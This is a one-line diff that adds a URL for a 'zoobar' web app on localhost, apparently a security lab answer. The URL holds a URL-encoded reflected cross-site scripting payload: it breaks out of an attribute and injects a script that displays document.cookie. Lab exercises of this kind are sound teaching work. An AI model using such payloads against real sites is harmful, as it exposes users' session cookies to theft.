@@ -1,0 +1,1 @@
+http://localhost:8080/zoobar/index.cgi/users?user=%22+size%3D10%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3Cspan+%22
